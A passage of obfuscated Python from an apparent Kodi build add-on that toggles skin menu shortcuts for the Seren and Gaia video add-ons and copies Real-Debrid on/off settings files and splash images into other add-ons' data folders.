      OO0O000O0OO00OOO0 .write (O0OOOO0OOOO0O0OO0 )#line:556
    O0O0O000OO000000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:560
    with open (O0O0O000OO000000O ,'r')as OO0O000O0OO00OOO0 :#line:561
      O0OOOO0OOOO0O0OO0 =OO0O000O0OO00OOO0 .read ()#line:562
    O0OOOO0OOOO0O0OO0 =O0OOOO0OOOO0O0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:580
    with open (O0O0O000OO000000O ,'w')as OO0O000O0OO00OOO0 :#line:583
      OO0O000O0OO00OOO0 .write (O0OOOO0OOOO0O0OO0 )#line:584
    O0O0O000OO000000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:587
    with open (O0O0O000OO000000O ,'r')as OO0O000O0OO00OOO0 :#line:588
      O0OOOO0OOOO0O0OO0 =OO0O000O0OO00OOO0 .read ()#line:589
    O0OOOO0OOOO0O0OO0 =O0OOOO0OOOO0O0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:607
    with open (O0O0O000OO000000O ,'w')as OO0O000O0OO00OOO0 :#line:610
      OO0O000O0OO00OOO0 .write (O0OOOO0OOOO0O0OO0 )#line:611
    O0O0O000OO000000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:613
    with open (O0O0O000OO000000O ,'r')as OO0O000O0OO00OOO0 :#line:614
      O0OOOO0OOOO0O0OO0 =OO0O000O0OO00OOO0 .read ()#line:615
    O0OOOO0OOOO0O0OO0 =O0OOOO0OOOO0O0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:633
    with open (O0O0O000OO000000O ,'w')as OO0O000O0OO00OOO0 :#line:636
      OO0O000O0OO00OOO0 .write (O0OOOO0OOOO0O0OO0 )#line:637
    O0O0O000OO000000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:639
    with open (O0O0O000OO000000O ,'r')as OO0O000O0OO00OOO0 :#line:640
      O0OOOO0OOOO0O0OO0 =OO0O000O0OO00OOO0 .read ()#line:641
    O0OOOO0OOOO0O0OO0 =O0OOOO0OOOO0O0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:659
    with open (O0O0O000OO000000O ,'w')as OO0O000O0OO00OOO0 :#line:662
      OO0O000O0OO00OOO0 .write (O0OOOO0OOOO0O0OO0 )#line:663
    O0O0O000OO000000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:666
    with open (O0O0O000OO000000O ,'r')as OO0O000O0OO00OOO0 :#line:667
      O0OOOO0OOOO0O0OO0 =OO0O000O0OO00OOO0 .read ()#line:668
    O0OOOO0OOOO0O0OO0 =O0OOOO0OOOO0O0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:686
    with open (O0O0O000OO000000O ,'w')as OO0O000O0OO00OOO0 :#line:689
      OO0O000O0OO00OOO0 .write (O0OOOO0OOOO0O0OO0 )#line:690
def rdbuildinstall ():#line:693
  try :#line:694
   OOOOOO00OO00O0OO0 =(ADDON .getSetting ("rdbuild"))#line:695
   if OOOOOO00OO00O0OO0 =='true':#line:696
     O000O0O0O00O0O0OO =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:697
     OOOOOO000O0000OOO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:698
     copyfile (O000O0O0O00O0O0OO ,OOOOOO000O0000OOO )#line:699
  except :#line:700
     pass #line:701
def rdbuildaddonoff ():#line:704
    OOOO00OO0OOOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:707
    with open (OOOO00OO0OOOOOO0O ,'r')as OOO0000O000O00O0O :#line:708
      OOO0O0OO0O00000OO =OOO0000O000O00O0O .read ()#line:709
    OOO0O0OO0O00000OO =OOO0O0OO0O00000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:727
    with open (OOOO00OO0OOOOOO0O ,'w')as OOO0000O000O00O0O :#line:730
      OOO0000O000O00O0O .write (OOO0O0OO0O00000OO )#line:731
    OOOO00OO0OOOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:735
    with open (OOOO00OO0OOOOOO0O ,'r')as OOO0000O000O00O0O :#line:736
      OOO0O0OO0O00000OO =OOO0000O000O00O0O .read ()#line:737
    OOO0O0OO0O00000OO =OOO0O0OO0O00000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:755
    with open (OOOO00OO0OOOOOO0O ,'w')as OOO0000O000O00O0O :#line:758
      OOO0000O000O00O0O .write (OOO0O0OO0O00000OO )#line:759
    OOOO00OO0OOOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:763
    with open (OOOO00OO0OOOOOO0O ,'r')as OOO0000O000O00O0O :#line:764
      OOO0O0OO0O00000OO =OOO0000O000O00O0O .read ()#line:765
    OOO0O0OO0O00000OO =OOO0O0OO0O00000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:783
    with open (OOOO00OO0OOOOOO0O ,'w')as OOO0000O000O00O0O :#line:786
      OOO0000O000O00O0O .write (OOO0O0OO0O00000OO )#line:787
    OOOO00OO0OOOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:791
    with open (OOOO00OO0OOOOOO0O ,'r')as OOO0000O000O00O0O :#line:792
      OOO0O0OO0O00000OO =OOO0000O000O00O0O .read ()#line:793
    OOO0O0OO0O00000OO =OOO0O0OO0O00000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:811
    with open (OOOO00OO0OOOOOO0O ,'w')as OOO0000O000O00O0O :#line:814
      OOO0000O000O00O0O .write (OOO0O0OO0O00000OO )#line:815
    OOOO00OO0OOOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:818
    with open (OOOO00OO0OOOOOO0O ,'r')as OOO0000O000O00O0O :#line:819
      OOO0O0OO0O00000OO =OOO0000O000O00O0O .read ()#line:820
    OOO0O0OO0O00000OO =OOO0O0OO0O00000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:838
    with open (OOOO00OO0OOOOOO0O ,'w')as OOO0000O000O00O0O :#line:841
      OOO0000O000O00O0O .write (OOO0O0OO0O00000OO )#line:842
    OOOO00OO0OOOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:844
    with open (OOOO00OO0OOOOOO0O ,'r')as OOO0000O000O00O0O :#line:845
      OOO0O0OO0O00000OO =OOO0000O000O00O0O .read ()#line:846
    OOO0O0OO0O00000OO =OOO0O0OO0O00000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:864
    with open (OOOO00OO0OOOOOO0O ,'w')as OOO0000O000O00O0O :#line:867
      OOO0000O000O00O0O .write (OOO0O0OO0O00000OO )#line:868
    OOOO00OO0OOOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:870
    with open (OOOO00OO0OOOOOO0O ,'r')as OOO0000O000O00O0O :#line:871
      OOO0O0OO0O00000OO =OOO0000O000O00O0O .read ()#line:872
    OOO0O0OO0O00000OO =OOO0O0OO0O00000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:890
    with open (OOOO00OO0OOOOOO0O ,'w')as OOO0000O000O00O0O :#line:893
      OOO0000O000O00O0O .write (OOO0O0OO0O00000OO )#line:894
    OOOO00OO0OOOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:897
    with open (OOOO00OO0OOOOOO0O ,'r')as OOO0000O000O00O0O :#line:898
      OOO0O0OO0O00000OO =OOO0000O000O00O0O .read ()#line:899
    OOO0O0OO0O00000OO =OOO0O0OO0O00000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:917
    with open (OOOO00OO0OOOOOO0O ,'w')as OOO0000O000O00O0O :#line:920
      OOO0000O000O00O0O .write (OOO0O0OO0O00000OO )#line:921
def rdbuildinstalloff ():#line:924
    try :#line:925
       O00OO0O0O0OOO00O0 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:926
       OOOOOO0000OO0O000 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:927
       copyfile (O00OO0O0O0OOO00O0 ,OOOOOO0000OO0O000 )#line:929
       O00OO0O0O0OOO00O0 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:931
       OOOOOO0000OO0O000 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:932
       copyfile (O00OO0O0O0OOO00O0 ,OOOOOO0000OO0O000 )#line:934
       O00OO0O0O0OOO00O0 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:936
       OOOOOO0000OO0O000 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:937
       copyfile (O00OO0O0O0OOO00O0 ,OOOOOO0000OO0O000 )#line:939
       O00OO0O0O0OOO00O0 =ADDONPATH +"/resources/rdoff/Splash.png"#line:942
       OOOOOO0000OO0O000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:943
       copyfile (O00OO0O0O0OOO00O0 ,OOOOOO0000OO0O000 )#line:945
    except :#line:947
       pass #line:948
def rdbuildaddonON ():#line:955
    O00000OO00O00O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:957
    with open (O00000OO00O00O0OO ,'r')as OO0OOOOOOO0OOO0O0 :#line:958
      O0OO0000O000O00O0 =OO0OOOOOOO0OOO0O0 .read ()#line:959
    O0OO0000O000O00O0 =O0OO0000O000O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:977
    with open (O00000OO00O00O0OO ,'w')as OO0OOOOOOO0OOO0O0 :#line:980
      OO0OOOOOOO0OOO0O0 .write (O0OO0000O000O00O0 )#line:981
    O00000OO00O00O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:985
    with open (O00000OO00O00O0OO ,'r')as OO0OOOOOOO0OOO0O0 :#line:986
      O0OO0000O000O00O0 =OO0OOOOOOO0OOO0O0 .read ()#line:987
    O0OO0000O000O00O0 =O0OO0000O000O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1005
    with open (O00000OO00O00O0OO ,'w')as OO0OOOOOOO0OOO0O0 :#line:1008
      OO0OOOOOOO0OOO0O0 .write (O0OO0000O000O00O0 )#line:1009
    O00000OO00O00O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1013
    with open (O00000OO00O00O0OO ,'r')as OO0OOOOOOO0OOO0O0 :#line:1014
      O0OO0000O000O00O0 =OO0OOOOOOO0OOO0O0 .read ()#line:1015
    O0OO0000O000O00O0 =O0OO0000O000O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1033
    with open (O00000OO00O00O0OO ,'w')as OO0OOOOOOO0OOO0O0 :#line:1036
      OO0OOOOOOO0OOO0O0 .write (O0OO0000O000O00O0 )#line:1037
    O00000OO00O00O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1041
    with open (O00000OO00O00O0OO ,'r')as OO0OOOOOOO0OOO0O0 :#line:1042
      O0OO0000O000O00O0 =OO0OOOOOOO0OOO0O0 .read ()#line:1043
    O0OO0000O000O00O0 =O0OO0000O000O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1061
    with open (O00000OO00O00O0OO ,'w')as OO0OOOOOOO0OOO0O0 :#line:1064
      OO0OOOOOOO0OOO0O0 .write (O0OO0000O000O00O0 )#line:1065
    O00000OO00O00O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1068
    with open (O00000OO00O00O0OO ,'r')as OO0OOOOOOO0OOO0O0 :#line:1069
      O0OO0000O000O00O0 =OO0OOOOOOO0OOO0O0 .read ()#line:1070
    O0OO0000O000O00O0 =O0OO0000O000O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1088
    with open (O00000OO00O00O0OO ,'w')as OO0OOOOOOO0OOO0O0 :#line:1091
      OO0OOOOOOO0OOO0O0 .write (O0OO0000O000O00O0 )#line:1092
    O00000OO00O00O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1094
    with open (O00000OO00O00O0OO ,'r')as OO0OOOOOOO0OOO0O0 :#line:1095
      O0OO0000O000O00O0 =OO0OOOOOOO0OOO0O0 .read ()#line:1096
    O0OO0000O000O00O0 =O0OO0000O000O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1114
    with open (O00000OO00O00O0OO ,'w')as OO0OOOOOOO0OOO0O0 :#line:1117
      OO0OOOOOOO0OOO0O0 .write (O0OO0000O000O00O0 )#line:1118
    O00000OO00O00O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1120
    with open (O00000OO00O00O0OO ,'r')as OO0OOOOOOO0OOO0O0 :#line:1121
      O0OO0000O000O00O0 =OO0OOOOOOO0OOO0O0 .read ()#line:1122
    O0OO0000O000O00O0 =O0OO0000O000O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1140
    with open (O00000OO00O00O0OO ,'w')as OO0OOOOOOO0OOO0O0 :#line:1143
      OO0OOOOOOO0OOO0O0 .write (O0OO0000O000O00O0 )#line:1144
    O00000OO00O00O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1147
    with open (O00000OO00O00O0OO ,'r')as OO0OOOOOOO0OOO0O0 :#line:1148
      O0OO0000O000O00O0 =OO0OOOOOOO0OOO0O0 .read ()#line:1149
    O0OO0000O000O00O0 =O0OO0000O000O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1167
    with open (O00000OO00O00O0OO ,'w')as OO0OOOOOOO0OOO0O0 :#line:1170
      OO0OOOOOOO0OOO0O0 .write (O0OO0000O000O00O0 )#line:1171
def rdbuildinstallON ():#line:1174
    try :#line:1176
       O0O00O0O00O000000 =ADDONPATH +"/resources/rd/victory.xml"#line:1177
       OOOOO00OOO00O0000 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1178
       copyfile (O0O00O0O00O000000 ,OOOOO00OOO00O0000 )#line:1180
       O0O00O0O00O000000 =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1182
       OOOOO00OOO00O0000 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1183
       copyfile (O0O00O0O00O000000 ,OOOOO00OOO00O0000 )#line:1185
       O0O00O0O00O000000 =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1187
       OOOOO00OOO00O0000 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1188
       copyfile (O0O00O0O00O000000 ,OOOOO00OOO00O0000 )#line:1190
       O0O00O0O00O000000 =ADDONPATH +"/resources/rd/Splash.png"#line:1193
       OOOOO00OOO00O0000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1194
       copyfile (O0O00O0O00O000000 ,OOOOO00OOO00O0000 )#line:1196
    except :#line:1198
       pass #line:1199
def rdbuild ():#line:1209
	O00O000OOO00OO0O0 =(ADDON .getSetting ("rdbuild"))#line:1210
	if O00O000OOO00OO0O0 =='true':#line:1211
		O00O0000000O00000 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1212
